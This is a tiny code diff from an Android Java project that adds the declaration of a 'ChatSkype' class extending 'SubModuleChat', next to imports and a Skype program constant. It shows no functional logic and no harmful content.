@@ -24,6 +24,8 @@ import com.android.networking.db.RecordVisitor;
 import com.android.networking.file.Path;
 import com.android.networking.util.Check;
 import com.android.networking.util.StringUtils;
+
+public class ChatSkype extends SubModuleChat {
 	private static final String TAG = "ChatSkype";
 
 	private static final int PROGRAM_SKYPE = 0x01;
